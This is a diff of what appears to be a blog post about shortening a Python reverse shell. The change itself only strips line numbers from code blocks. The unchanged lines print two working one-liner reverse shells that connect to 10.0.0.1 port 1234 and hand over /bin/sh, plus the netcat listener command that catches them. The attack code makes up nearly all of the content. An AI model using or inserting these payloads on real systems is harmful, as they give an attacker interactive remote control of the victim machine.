@@ -14,19 +14,19 @@ Inspired by an other python reverse shell found online.
 
 The original version (224 bytes)
 
-{% highlight python linenos %}
+{% highlight python %}
 	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 {% endhighlight %}
 
 The much smaller new version (143 bytes)
 
-{% highlight python linenos %}
+{% highlight python %}
 	python -c'import socket,os;s=socket.socket();s.connect(("10.0.0.1",1234));h=s.fileno();d=os.dup2;d(h,0);d(h,1);d(h,2);os.execl("/bin/sh","-i")'
 {% endhighlight %}
 
 To receive the reverse shell a simple nc works great.
 
-{% highlight bash linenos %}
+{% highlight bash %}
 	nc -l -v -p 1234
 {% endhighlight %}
 
